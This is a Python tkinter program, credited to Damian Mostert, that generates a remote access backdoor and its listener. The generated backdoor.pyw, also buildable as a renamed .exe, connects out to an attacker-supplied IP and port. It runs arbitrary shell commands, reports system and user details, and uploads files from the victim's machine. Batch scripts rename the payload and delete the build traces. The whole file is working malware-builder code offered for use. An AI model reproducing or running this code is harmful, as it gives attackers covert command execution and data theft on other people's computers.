###AUTHER IS DAMIAN MOSTERT
import tkinter as tk
from tkinter import *
import subprocess
window = tk.Tk()
window.geometry("382x195")
window.configure(bg='white')
window.title("Bill Cipher")
window.resizable(width=False, height=False)
window.iconbitmap("hat.ico")
theme = Frame(window,)
theme.place(x = 367, y = 166)
bill = PhotoImage(file = "BILL.png")
BILL = Label( window, image = bill)
BILL.place(x = 232, y = 10)
BILL.configure(bg='white')
font77=('mono space', 8)
def LIGHT():
    font77=('mono space', 8)
    window.configure(bg='white')
    BILL.configure(bg='white')
    btn1.config(bg='light grey',fg='#404040',relief='groove')
    btn2.config(bg='light grey',fg='#404040',relief='groove')
    btn3.config(bg='light grey',fg='#404040',relief='groove')
    btn4.config(bg='light grey',fg='#404040',relief='groove')
    label1 = Label( window, text = "Enter your IP Address " ,bg='white',fg='#404040',font = font77)
    label1.place(x = 8, y = 29)
    label1 = Label( window, text = "Port Number " ,bg='white',fg='#404040',font=font77)
    label1.place(x = 55, y = 53)
    label1 = Label( window, text = "Configure Server  " ,bg='white',fg='#404040', font = 'monospace')
    label1.place(x = 70, y = 3)
    label1 = Label( window, text = "Create Backdoor  " ,bg='white',fg='#404040', font = 'monospace')
    label1.place(x = 70, y = 76)
    boxa.config(bg='light grey',fg='#404040',relief='groove')
    box.config(bg='light grey',fg='#404040',relief='groove')
    boxip.config(bg='light grey',fg='#404040',relief='groove')
    boxp.config(bg='light grey',fg='#404040',relief='groove')
    boxn.config(bg='light grey',fg='#404040',relief='groove')
    label1 = Label( window, text = "Enter fileneme " ,bg='white',fg='#404040',font = font77)
    label1.place(x = 46, y = 102)              
    label1 = Label( window, text = "Enter your IP Address " ,bg='white',fg='#404040',font = font77)
    label1.place(x = 8, y = 126)
    label1 = Label( window, text = "Port Number " ,bg='white',fg='#404040',font = font77)
    label1.place(x = 55, y = 148)
def DARK():
    font77=('mono space', 8)
    window.configure(bg='#404040')
    BILL.configure(bg='#404040')
    btn1.config(bg='grey',fg='yellow',relief='raised')
    btn2.config(bg='grey',fg='yellow',relief='raised')
    btn3.config(bg='grey',fg='yellow',relief='raised')
    btn4.config(bg='grey',fg='yellow',relief='raised')
    label1 = Label( window, text = "Enter your IP Address " ,bg='#404040', fg='yellow',font = font77)
    label1.place(x = 8, y = 29)
    label1 = Label( window, text = "Port Number " ,bg='#404040', fg='yellow',font = font77)
    label1.place(x = 55, y = 53)
    label1 = Label( window, text = "Configure Server  " ,bg='#404040', fg='yellow', font = 'monospace')
    label1.place(x = 70, y = 3)
    label1 = Label( window, text = "Create Backdoor  " ,bg='#404040',fg='yellow', font = 'monospace')
    label1.place(x = 70, y = 76)
    boxa.config(bg='grey',fg='yellow',relief='ridge')
    box.config(bg='grey',fg='yellow',relief='ridge')
    boxip.config(bg='grey',fg='yellow',relief='ridge')
    boxp.config(bg='grey',fg='yellow',relief='ridge')
    boxn.config(bg='grey',fg='yellow',relief='ridge')
    label1 = Label( window, text = "Enter fileneme " ,bg='#404040',fg='yellow',font = font77)
    label1.place(x = 46, y = 102)             
    label1 = Label( window, text = "Enter your IP Address " ,bg='#404040',fg='yellow',font = font77)
    label1.place(x = 8, y = 126)
    label1 = Label( window, text = "Port Number " ,bg='#404040',fg='yellow',font = font77)
    label1.place(x = 55, y = 148)
label1 = Label( window, text = "Enter your IP Address " ,bg='white',fg='#404040',font = font77)
label1.place(x = 8, y = 29)
label1 = Label( window, text = "Port Number " ,bg='white',fg='#404040',font = font77)
label1.place(x = 55, y = 53)
label1 = Label( window, text = "Configure Server  " ,bg='white',fg='#404040', font = 'monospace')
label1.place(x = 70, y = 3)
label1 = Label( window, text = "Create Backdoor  " ,bg='white',fg='#404040', font = 'monospace')
label1.place(x = 70, y = 76)
frame2 = Frame(window,)
frame2.place(x = 125, y = 30)
boxa=Text(frame2, height=1, width=15)
boxa.pack()
boxa.config(bg='light grey',fg='#404040',bd=2,relief='groove' )
frame3 = Frame(window,)
frame3.place(x = 125, y = 53)
box=Text(frame3, height=1, width=4)
box.pack()
box.config(bg='light grey',fg='#404040',bd=2,relief='groove' )
X=box.get("1.0","end-1c")
Y=boxa.get("1.0","end-1c")

label1 = Label( window, text = "Enter filename " ,bg='white',fg='#404040',font = font77)
label1.place(x = 46, y = 102)             
label1 = Label( window, text = "Enter your IP Address " ,bg='white',fg='#404040',font = font77)
label1.place(x = 8, y = 126)
label1 = Label( window, text = "Port Number " ,bg='white',fg='#404040',font = font77)
label1.place(x = 55, y = 148)
def server ():
    X=box.get("1.0","end-1c")
    Y=boxa.get("1.0","end-1c")
    NL ="""

"""
    P1 = """
import socket
import subprocess
import os
import platform

print("your avadable commands are as follows :")
print("#########################################")
print("sysinfo   to get information about system ")
print("ls       to list items in directory")
print("cd        to go to another directory")
print("download  to dowmload a file ")
print("#########################################")
"""
    LHOST = ("""LHOST = """)
    LPORT = ("""LPORT = """)
    tc =("""'""")
    P2 = """



sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((LHOST, LPORT))
sock.listen(1)
print("Listening on port", LPORT)
client, addr = sock.accept()

while True:
    input_header = client.recv(1024)
    command = input(input_header.decode()).encode()

    if command.decode("utf-8").split(" ")[0] == "download":
        file_name = command.decode("utf-8").split(" ")[1][::-1]
        client.send(command)
        with open(file_name, "wb") as f:
            read_data = client.recv(1024)
            while read_data:
                f.write(read_data)
                read_data = client.recv(1024)
                if read_data == b"DONE":
                    break
    if command == b"":
        print("Please enter a command")                    
    else:
        client.send(command)
        data = client.recv(1024).decode("utf-8")
        if data == "exit":
            print("Terminating connection", addr[0])
            break
        print(data)
client.close()
sock.close()
"""
    with open("server.py",'w') as out:
        out.writelines([P1,NL,LHOST,tc,Y,tc,NL,LPORT,X,NL,P2,])
def create ():
    A=boxn.get("1.0","end-1c")
    B=boxip.get("1.0","end-1c")
    C=boxp.get("1.0","end-1c")
    part1 = """import socket
import subprocess
import os
import platform
import getpass
from time import sleep

"""
    part2 = """
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((RHOST, RPORT))

while True:
    try:
        header = "Enter command for other device "
        sock.send(header.encode())
        STDOUT, STDERR = None, None
        cmd = sock.recv(1024).decode("utf-8")

        # List files in the dir
        if cmd == "ls":
            sock.send(str(os.listdir(".")).encode())
            
        # Change directory
        elif cmd.split(" ")[0] == "cd":
            os.chdir(cmd.split(" ")[1])
            sock.send("Changed directory to {}".format(os.getcwd()).encode())
        # Get system info
        elif cmd == "sysinfo":
            sysinfo = f"""
    x = ('"""')
    part3 ="""
Operating System: {platform.system()}
Computer Name: {platform.node()}
Username: {getpass.getuser()}
Release Version: {platform.release()}
Processor Architecture: {platform.processor()}
            """

        
    part4 = """
            sock.send(sysinfo.encode())
        # Download files
        elif cmd.split(" ")[0] == "download":
            with open(cmd.split(" ")[1], "rb") as f:
                file_data = f.read(1024)
                while file_data:
                    print("Sending", file_data)
                    sock.send(file_data)
                    file_data = f.read(1024)
                sleep(2)
                sock.send(b"DONE")
            print("Finished sending data")

        # Terminate the connection
        elif cmd == "exit":
            sock.send(b"exit")
            break

        # Run any other command
        else:
            comm = subprocess.Popen(str(cmd), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            STDOUT, STDERR = comm.communicate()
            if not STDOUT:
                sock.send(STDERR)
            else:
                sock.send(STDOUT)

        # If the connection terminates
        if not cmd:
            print("Connection dropped")
            break
    except Exception as e:
        sock.send("An error has occured: {}".format(str(e)).encode())
sock.close()

"""
    RHOST = ("""RHOST = """)
    RPORT = ("""RPORT = """)
    tc =("""'""")
    NL ="""

"""
        
    with open("backdoor.pyw",'w') as out:
        out.writelines([part1,NL,RHOST,tc,B,tc,NL,RPORT,C,NL,part2,x,part3,x,part4])
    RENAME ='''
rename "backdoor.pyw" '''+A+""".pyw
"""
    DELETE = '''
del backdoor.pyw
'''
    with open("cnv.bat",'w') as out:
         out.writelines([RENAME,DELETE])
    subprocess.call('cnv.bat ',shell=True)
def create2 ():
    A=boxn.get("1.0","end-1c")
    B=boxip.get("1.0","end-1c")
    C=boxp.get("1.0","end-1c")
    part1 = """import socket
import subprocess
import os
import platform
import getpass
from time import sleep

"""
    part2 = """
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((RHOST, RPORT))

while True:
    try:
        header = "Enter command for other device :"
        sock.send(header.encode())
        STDOUT, STDERR = None, None
        cmd = sock.recv(1024).decode("utf-8")

        # List files in the dir
        if cmd == "ls":
            sock.send(str(os.listdir(".")).encode())
            
        # Change directory
        elif cmd.split(" ")[0] == "cd":
            os.chdir(cmd.split(" ")[1])
            sock.send("Changed directory to {}".format(os.getcwd()).encode())
        # Get system info
        elif cmd == "sysinfo":
            sysinfo = f"""
    x = ('"""')
    part3 ="""
Operating System: {platform.system()}
Computer Name: {platform.node()}
Username: {getpass.getuser()}
Release Version: {platform.release()}
Processor Architecture: {platform.processor()}

            """

        
    part4 = """
            sock.send(sysinfo.encode())
        # Download files
        elif cmd.split(" ")[0] == "download":
            with open(cmd.split(" ")[1], "rb") as f:
                file_data = f.read(1024)
                while file_data:
                    print("Sending", file_data)
                    sock.send(file_data)
                    file_data = f.read(1024)
                sleep(2)
                sock.send(b"DONE")
            print("Finished sending data")

        # Terminate the connection
        elif cmd == "exit":
            sock.send(b"exit")
            break

        # Run any other command
        else:
            comm = subprocess.Popen(str(cmd), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            STDOUT, STDERR = comm.communicate()
            if not STDOUT:
                sock.send(STDERR)
            else:
                sock.send(STDOUT)

        # If the connection terminates
        if not cmd:
            print("Connection dropped")
            break
    except Exception as e:
        sock.send("An error has occured: {}".format(str(e)).encode())
sock.close()

"""
    RHOST = ("""RHOST = """)
    RPORT = ("""RPORT = """)
    tc =("""'""")
    NL ="""

"""
        
    with open("backdoor.pyw",'w') as out:
        out.writelines([part1,NL,RHOST,tc,B,tc,NL,RPORT,C,NL,part2,x,part3,x,part4])


    CONVERT = "Convert.exe --onefile backdoor.pyw"
    nl="""

"""
    RENAME ='''cd dist
rename "backdoor.exe" '''+A+""".exe
cd .."""
    DELETE = '''
del backdoor.pyw
del backdoor.spec
RMDIR "build" /S /Q
RMDIR "__pycache__" /S /Q
exit
'''
    with open("cnv.bat",'w') as out:
         out.writelines([CONVERT,nl,RENAME,nl,DELETE])
    subprocess.call('start cmd /k cnv.bat ',shell=True)

frameA = Frame(window,)
frameA.place(x = 125, y = 103)
boxn=Text(frameA, height=1, width=15)
boxn.pack()
boxn.config(bg='light grey',fg='#404040',bd=2,relief='groove')

frameB = Frame(window,)
frameB.place(x = 125, y = 126)
boxip=Text(frameB, height=1, width=15)
boxip.pack()
boxip.config(bg='light grey',fg='#404040',bd=2,relief='groove')

frameC = Frame(window,)
frameC.place(x = 125, y = 149)
boxp=Text(frameC, height=1, width=4)
boxp.pack()
boxp.config(bg='light grey',fg='#404040',bd=2,relief='groove')

def startserver():
    subprocess.call("start cmd /k server.py ",shell=True)
font=('mono space', 5)
open_btn = tk.Button(theme, text='', font=font, fg='#404040', bg='white',bd=1, width=1, command=LIGHT,relief='groove')
open_btn.pack()
close_btn = tk.Button(theme, text='', font=font, fg='white', bg='#404040',bd=1, width=1, command=DARK,relief='groove')
close_btn.pack()

serverbuton = Frame(window,)
serverbuton.place(x = 259, y = 166)
font=('mono space', 7)
btn1 = tk.Button(serverbuton, text='Start Server', font=font, bg='light grey', fg='#404040',relief='groove',width=16,bd=2, command=startserver)
btn1.pack()

createbuton = Frame(window,)
createbuton.place(x = 165, y = 150)
font=('mono space', 7)
btn2 = tk.Button(createbuton, text='.exe ', font=font, bg='light grey', fg='#404040',bd=2, width=5, command=create2,relief='groove')
btn2.pack()

createbuton2 = Frame(window,)
createbuton2.place(x = 207, y = 150)
btn4 = tk.Button(createbuton2, text='.pyw ', font=font, bg='light grey', fg='#404040',bd=2, width=5, command=create,relief='groove')
btn4.pack()

savebuton = Frame(window,)
savebuton.place(x = 165, y = 54)
font=('mono space', 7)
btn3 = tk.Button(savebuton, text='Save', font=font, bg='Light grey', fg='#404040',bd=2, width=12, command=server,relief='groove')
btn3.pack()

window.mainloop()

